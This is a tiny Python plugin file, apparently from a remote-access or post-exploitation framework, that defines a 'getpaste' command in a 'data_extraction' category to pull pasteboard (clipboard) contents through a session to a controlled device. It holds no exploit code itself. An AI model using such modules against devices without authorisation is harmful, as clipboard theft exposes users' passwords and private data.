class command:
    def __init__(self):
        self.name         = "getpaste"
        self.description  = "get pasteboard contents"
        self.category     = "data_extraction"
    
    def run(self,session,cmd_data):
        print(session.send_command(cmd_data))